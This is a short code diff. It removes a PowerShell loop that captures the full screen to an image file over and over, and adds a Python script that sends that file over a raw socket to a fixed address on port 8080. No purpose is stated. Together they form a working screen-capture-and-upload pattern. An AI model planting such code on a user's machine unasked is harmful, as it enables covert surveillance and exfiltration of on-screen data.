@@ -1,17 +1,17 @@
-while ($True)
-{
-	$File = 'img.png'
-	Add-Type -AssemblyName System.Windows.Forms
-	Add-type -AssemblyName System.Drawing
-	$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-	$Width = $Screen.Width
-	$Height = $Screen.Height
-	$Left = $Screen.Left
-	$Top = $Screen.Top
-	$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-	$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-	$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-	$bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png) 
-	
-	python ./sendfile.py
-}
+import os
+import socket
+import struct
+
+
+def send_file(sck: socket.socket, filename):
+    filesize = os.path.getsize(filename)
+    sck.sendall(struct.pack("<Q", filesize))
+    with open(filename, "rb") as f:
+        while read_bytes := f.read(1024):
+            sck.sendall(read_bytes)
+
+
+with socket.create_connection(("192.168.2.190", 8080)) as conn:
+    send_file(conn, "img.png")
+
+print("Sent.")
